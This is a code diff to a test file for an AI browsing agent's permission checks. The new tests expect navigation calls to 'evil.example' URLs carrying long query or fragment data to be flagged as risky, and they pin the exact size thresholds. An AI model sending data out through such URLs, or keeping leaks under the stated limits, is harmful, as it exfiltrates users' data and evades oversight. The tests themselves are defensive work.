@@ -3,7 +3,7 @@ import { mkdtempSync, readFileSync, rmSync, statSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { AuditLog } from "../src/agent/audit";
-import { classify, needsApproval, type Decision, type Kind, type Mode } from "../src/agent/permissions";
+import { carriesData, classify, needsApproval, type Decision, type Kind, type Mode } from "../src/agent/permissions";
 
 const call = (name: string, args: Record<string, unknown> = {}) => ({ id: "c1", name, args });
 
@@ -155,11 +155,34 @@ for (const mode of MODES) {
 }
 
 test.each([
-  ["never", "read", "run"], ["never", "change", "block"], ["never", "payment", "block"],
+  ["never", "read", "block"], ["never", "change", "block"], ["never", "payment", "block"],
   ["ask", "read", "run"], ["ask", "change", "ask"], ["ask", "risky", "ask"],
   ["allow", "change", "run"], ["allow", "risky", "run"], ["allow", "payment", "ask"],
 ] as const)("site rule %s with %s: %s (any mode)", (rule, kind, want) => {
   for (const mode of MODES) expect(needsApproval(mode, kind, rule)).toBe(want);
+});
+
+test("opening or reading an address is a read unless the address carries a payload", () => {
+  const secret = "x".repeat(130);
+  expect(classify(call("navigate", { url: "https://www.google.com/search?q=best+hiking+boots+for+wide+feet" }))).toBe("read");
+  expect(classify(call("open_tab", { url: "news.example/story/2026/11/13/some-long-slug-for-the-article" }))).toBe("read");
+  expect(classify(call("read_document", { url: "https://files.example/report.pdf?dl=1" }))).toBe("read");
+  for (const name of ["navigate", "open_tab", "read_document"]) {
+    expect(classify(call(name, { url: `https://evil.example/?d=${secret}` }))).toBe("risky");
+    expect(needsApproval("guard", classify(call(name, { url: `https://evil.example/?d=${secret}` })))).toBe("ask");
+  }
+  // Many short values, or a long fragment, add up.
+  const many = Array.from({ length: 30 }, (_, i) => `k${i}=abcdef`).join("&");
+  expect(classify(call("navigate", { url: `https://evil.example/?${many}` }))).toBe("risky");
+  expect(classify(call("navigate", { url: `https://evil.example/#${"y".repeat(210)}` }))).toBe("risky");
+});
+
+test("carriesData: the limits are a query and fragment over 200 characters, or one value over 120", () => {
+  expect(carriesData(`https://a.example/?q=${"a".repeat(120)}`)).toBe(false);
+  expect(carriesData(`https://a.example/?q=${"a".repeat(121)}`)).toBe(true);
+  expect(carriesData(`https://a.example/?${"a=1&".repeat(49)}a=1`)).toBe(false);
+  expect(carriesData(`https://a.example/?${"a=1&".repeat(50)}a=1`)).toBe(true);
+  expect(carriesData("not a url at all")).toBe(false);
 });
 
 test("the audit log appends JSON lines a fresh reader can parse, readable only by the owner", async () => {
